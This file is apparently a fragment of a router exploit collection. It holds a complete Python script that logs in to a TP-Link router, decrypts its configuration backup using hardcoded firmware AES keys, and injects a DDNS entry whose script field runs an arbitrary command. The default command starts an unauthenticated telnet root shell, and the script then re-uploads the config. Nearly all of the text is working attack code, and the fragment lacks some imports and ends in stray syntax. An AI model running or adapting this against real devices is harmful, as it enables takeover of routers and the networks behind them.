from Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP # pip install pycryptodome
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from urllib.parse import urlencode

class WebClient(object):

	def __init__(self, target, password):
		self.target = target
		self.password = password.encode('utf-8')
		self.password_hash = hashlib.md5(('admin%s'%password).encode('utf-8')).hexdigest().encode('utf-8')
		self.aes_key = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')
		self.aes_iv = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')

		self.stok = ''
		self.session = requests.Session()

		data = self.basic_request('/login?form=auth', {'operation':'read'})
		if data['success'] != True:
			print('[!] unsupported router')
			return
		self.sign_rsa_n = int(data['data']['key'][0], 16)
		self.sign_rsa_e = int(data['data']['key'][1], 16)
		self.seq = data['data']['seq']

		data = self.basic_request('/login?form=keys', {'operation':'read'})
		self.password_rsa_n = int(data['data']['password'][0], 16)
		self.password_rsa_e = int(data['data']['password'][1], 16)

		self.stok = self.login()


	def aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):
		cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
		plaintext_padded = pad(plaintext, aes_block_size)
		return cipher.encrypt(plaintext_padded)


	def aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):
		cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
		plaintext_padded = cipher.decrypt(ciphertext)
		plaintext = unpad(plaintext_padded, aes_block_size)
		return plaintext


	def rsa_encrypt(self, n, e, plaintext):
		public_key = RSA.construct((n, e)).publickey()
		encryptor = PKCS1_v1_5.new(public_key)
		block_size = int(public_key.n.bit_length()/8) - 11
		encrypted_text = ''
		for i in range(0, len(plaintext), block_size):
			encrypted_text += encryptor.encrypt(plaintext[i:i+block_size]).hex()
		return encrypted_text


	def download_request(self, url, post_data):
		res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data=post_data, stream=True)
		filepath = os.getcwd()+'/'+re.findall(r'(?<=filename=")[^"]+', res.headers['Content-Disposition'])[0]
		if os.path.exists(filepath):
			print('[!] can\'t download, file "%s" already exists' % filepath)
			return
		with open(filepath, 'wb') as f:
			for chunk in res.iter_content(chunk_size=4096):
				f.write(chunk)
		return filepath


	def basic_request(self, url, post_data, files_data={}):
		res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data=post_data, files=files_data)
		return json.loads(res.content)


	def encrypted_request(self, url, post_data):
		serialized_data = urlencode(post_data)
		encrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode('utf-8'))
		encrypted_data = base64.b64encode(encrypted_data)

		signature = ('k=%s&i=%s&h=%s&s=%d'.encode('utf-8')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))
		encrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)

		res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data={'sign':encrypted_signature, 'data':encrypted_data}) # order of params is important
		if(res.status_code != 200):
			print('[!] url "%s" returned unexpected status code'%(url))
			return
		encrypted_data = json.loads(res.content)
		encrypted_data = base64.b64decode(encrypted_data['data'])
		data = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, encrypted_data)
		return json.loads(data)


	def login(self):
		post_data = {'operation':'login', 'password':self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)}
		data = self.encrypted_request('/login?form=login', post_data)
		if data['success'] != True:
			print('[!] login failed')
			return
		print('[+] logged in, received token (stok): %s'%(data['data']['stok']))
		return data['data']['stok']



class BackupParser(object):

	def __init__(self, filepath):
		self.encrypted_path = os.path.abspath(filepath)
		self.decrypted_path = os.path.splitext(filepath)[0]

		self.aes_key = bytes.fromhex('2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua
		self.iv = bytes.fromhex('360028C9064242F81074F4C127D299F6') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua


	def aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):
		cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
		plaintext_padded = pad(plaintext, aes_block_size)
		return cipher.encrypt(plaintext_padded)


	def aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):
		cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
		plaintext_padded = cipher.decrypt(ciphertext)
		plaintext = unpad(plaintext_padded, aes_block_size)
		return plaintext


	def encrypt_config(self):
		if not os.path.isdir(self.decrypted_path):
			print('[!] invalid directory "%s"'%(self.decrypted_path))
			return

		# encrypt, compress each .xml using zlib and add them to tar archive
		with tarfile.open('%s/data.tar'%(self.decrypted_path), 'w') as tar:
			for filename in os.listdir(self.decrypted_path):
				basename,ext = os.path.splitext(filename)
				if ext == '.xml':
					xml_path = '%s/%s'%(self.decrypted_path,filename)
					bin_path = '%s/%s.bin'%(self.decrypted_path,basename)
					with open(xml_path, 'rb') as f:
						plaintext = f.read()
					if len(plaintext) == 0:
						f = open(bin_path, 'w')
						f.close()
					else:
						compressed = zlib.compress(plaintext)
						encrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)
						with open(bin_path, 'wb') as f:
							f.write(encrypted)
					tar.add(bin_path, os.path.basename(bin_path))
					os.unlink(bin_path)
		# compress tar archive using zlib and encrypt
		with open('%s/md5_sum'%(self.decrypted_path), 'rb') as f1, open('%s/data.tar'%(self.decrypted_path), 'rb') as f2:
			compressed = zlib.compress(f1.read()+f2.read())
		encrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)
		# write into final config file
		with open('%s'%(self.encrypted_path), 'wb') as f:
			f.write(encrypted)
		os.unlink('%s/data.tar'%(self.decrypted_path))


	def decrypt_config(self):
		if not os.path.isfile(self.encrypted_path):
			print('[!] invalid file "%s"'%(self.encrypted_path))
			return

		# decrypt and decompress config file
		with open(self.encrypted_path, 'rb') as f:
			decrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, f.read())
		decompressed = zlib.decompress(decrypted)
		os.mkdir(self.decrypted_path)
		# store decrypted data into files
		with open('%s/md5_sum'%(self.decrypted_path), 'wb') as f:
			f.write(decompressed[0:16])
		with open('%s/data.tar'%(self.decrypted_path), 'wb') as f:
			f.write(decompressed[16:])
		# untar second part of decrypted data
		with tarfile.open('%s/data.tar'%(self.decrypted_path), 'r') as tar:
			tar.extractall(path=self.decrypted_path)
		# decrypt and decompress each .bin file from tar archive
		for filename in os.listdir(self.decrypted_path):
			basename,ext = os.path.splitext(filename)
			if ext == '.bin':
				bin_path = '%s/%s'%(self.decrypted_path,filename)
				xml_path = '%s/%s.xml'%(self.decrypted_path,basename)
				with open(bin_path, 'rb') as f:
					ciphertext = f.read()
				os.unlink(bin_path)
				if len(ciphertext) == 0:
					f = open(xml_path, 'w')
					f.close()
					continue
				decrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, ciphertext)
				decompressed = zlib.decompress(decrypted)
				with open(xml_path, 'wb') as f:
					f.write(decompressed)
		os.unlink('%s/data.tar'%(self.decrypted_path))


	def modify_config(self, command):
		xml_path = '%s/ori-backup-user-config.xml'%(self.decrypted_path)
		if not os.path.isfile(xml_path):
			print('[!] invalid file "%s"'%(xml_path))
			return

		with open(xml_path, 'r') as f:
			xml_content = f.read()

		# https://openwrt.org/docs/guide-user/services/ddns/client#detecting_wan_ip_with_script
		payload = '<service name="exploit">\n'
		payload += '<enabled>on</enabled>\n'
		payload += '<update_url>http://127.0.0.1/</update_url>\n'
		payload += '<domain>x.example.org</domain>\n'
		payload += '<username>X</username>\n'
		payload += '<password>X</password>\n'
		payload += '<ip_source>script</ip_source>\n'
		payload += '<ip_script>%s</ip_script>\n' % (command.replace('<','&lt;').replace('&','&amp;'))
		payload += '<interface>internet</interface>\n' # not worked for other interfaces
		payload += '<retry_interval>5</retry_interval>\n'
		payload += '<retry_unit>seconds</retry_unit>\n'
		payload += '<retry_times>3</retry_times>\n'
		payload += '<check_interval>12</check_interval>\n'
		payload += '<check_unit>hours</check_unit>\n'
		payload += '<force_interval>30</force_interval>\n'
		payload += '<force_unit>days</force_unit>\n'
		payload += '</service>\n'

		if '<service name="exploit">' in xml_content:
			xml_content = re.sub(r'<service name="exploit">[\s\S]+?</service>\n</ddns>', '%s</ddns>'%(payload), xml_content, 1)
		else:
			xml_content = xml_content.replace('</service>\n</ddns>', '</service>\n%s</ddns>'%(payload), 1)
		with open(xml_path, 'w') as f:
			f.write(xml_content)



arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t', metavar='target', help='ip address of tp-link router', required=True)
arg_parser.add_argument('-p', metavar='password', required=True)
arg_parser.add_argument('-b', action='store_true', help='only backup and decrypt config')
arg_parser.add_argument('-r', metavar='backup_directory', help='only encrypt and restore directory with decrypted config')
arg_parser.add_argument('-c', metavar='cmd', default='/usr/sbin/telnetd -l /bin/login.sh', help='command to execute')
args = arg_parser.parse_args()

client = WebClient(args.t, args.p)
parser = None

if not args.r:
	print('[*] downloading config file ...')
	filepath = client.download_request('/admin/firmware?form=config_multipart', {'operation':'backup'})
	if not filepath:
		sys.exit(-1)

	print('[*] decrypting config file "%s" ...'%(filepath))
	parser = BackupParser(filepath)
	parser.decrypt_config()
	print('[+] successfully decrypted into directory "%s"'%(parser.decrypted_path))

if not args.b and not args.r:
	filepath = '%s_modified'%(parser.decrypted_path)
	os.rename(parser.decrypted_path, filepath)
	parser.decrypted_path = os.path.abspath(filepath)
	parser.encrypted_path = '%s.bin'%(filepath)
	parser.modify_config(args.c)
	print('[+] modified directory with decrypted config "%s" ...'%(parser.decrypted_path))

if not args.b:
	if parser is None:
		parser = BackupParser('%s.bin'%(args.r.rstrip('/')))
	print('[*] encrypting directory with modified config "%s" ...'%(parser.decrypted_path))
	parser.encrypt_config()
	data = client.basic_request('/admin/firmware?form=config_multipart', {'operation':'read'})
	timeout = data['data']['totaltime'] if data['success'] else 180
	print('[*] uploading modified config file "%s"'%(parser.encrypted_path))
	data = client.basic_request('/admin/firmware?form=config_multipart', {'operation':'restore'}, {'archive':open(parser.encrypted_path,'rb')})
	if not data['success']:
		print('[!] unexpected response')
		print(data)
		sys.exit(-1)

	print('[+] config file successfully uploaded')
	print('[*] router will reboot in few seconds... when it becomes online again (few minutes), try "telnet %s" and enjoy root shell !!!'%(args.t)
"""
}


# print(model_exp_dic["TOTOLINK_A7000R"][0])